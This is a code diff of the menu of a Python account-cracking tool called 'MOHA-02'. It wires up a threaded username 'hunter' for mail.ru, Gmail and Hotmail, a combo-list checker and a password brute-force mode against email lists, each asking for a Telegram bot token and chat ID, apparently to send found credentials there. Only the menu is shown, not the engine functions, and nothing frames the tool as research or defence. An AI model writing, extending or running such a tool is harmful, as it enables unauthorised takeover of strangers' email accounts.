+            d_map = {'1':['mail.ru','bk.ru'],'2':['gmail.com'],'3':['hotmail.com'],'4':['mail.ru','gmail.com','hotmail.com']}
+            
+            p_input = input(f"{M} [?] PLATFORMS (e.g 1,2,12): ").split(',')
             token = input(f"{M} [?] BOT TOKEN: ")
             chat_id = input(f"{M} [?] CHAT ID: ")
-            # يمكنك هنا إضافة استدعاء دالة الفحص إذا كانت جاهزة
+            length = int(input(f"{M} [?] USER LENGTH: ") or 8)
+
+            start_time = time.time()
+            # Launch Monitor
+            threading.Thread(target=stats_monitor, args=(start_time, 40), daemon=True).start()
+            
+            # Start 40 Threads
+            for _ in range(40):
+                threading.Thread(target=hunter_engine, args=(pre, length, gen_m, token, chat_id, p_input, d_map.get(d_ch, ['mail.ru']))).start()
+            
+            input() # Keep threads alive
+            stop_thread = True
+
+        elif choice in ['02', '2']:
+            logo()
+            path = input(f"{M} [?] COMBO FILE PATH: ")
+            token = input(f"{M} [?] BOT TOKEN: ")
+            chat_id = input(f"{M} [?] CHAT ID: ")
+            if os.path.exists(path):
+                with open(path, 'r') as f: combo = f.read().splitlines()
+                combo_checker_logic(combo, token, chat_id, ['12'])
+            else: print(f"{Z} [!] File Not Found.")
+
         elif choice in ['03', '3']:
             list_generator_engine()
+
         elif choice in ['04', '4']:
             logo()
-            print(f"{F} [1] Custom Pass [2] Wordlist [3] Smart Mode")
-            b_mode = input(f"{M} [?] SELECT BRUTE MODE: ")
-            f_path = input(f"{M} [?] EMAILS FILE: ")
-            tkn = input(f"{M} [?] BOT TOKEN: ")
-            cid = input(f"{M} [?] CHAT ID: ")
-            smart_brute_force_engine(f_path, tkn, cid, b_mode)
-        elif choice in ['00', '0']:
-            print(f"{Z} [!] EXITING SYSTEM... BYE!")
-            sys.exit()
+            path = input(f"{M} [?] EMAIL LIST PATH: ")
+            token = input(f"{M} [?] BOT TOKEN: ")
+            chat_id = input(f"{M} [?] CHAT ID: ")
+            print(f"{F} [1] Manual [2] Wordlist [3] Smart Auto-Gen")
+            b_mode = input(f"{M} [?] SELECT MODE: ")
+            smart_brute_force_engine(path, token, chat_id, b_mode)
 
+        elif choice in ['00', '0']:
+            print(f"\n{Z} [!] SHUTTING DOWN MOHA-02..."); sys.exit()
+
+# --- [ SYSTEM BOOT ] ---
 if __name__ == "__main__":
     try:
         main_menu()
     except KeyboardInterrupt:
-        print(f"\n{Z} [!] STOPPED BY USER.")
+        print(f"\n{Z} [!] EXITED.")
         sys.exit()
+    except Exception as e:
+        print(f"\n{Z} [!] SYSTEM ERROR: {e}")
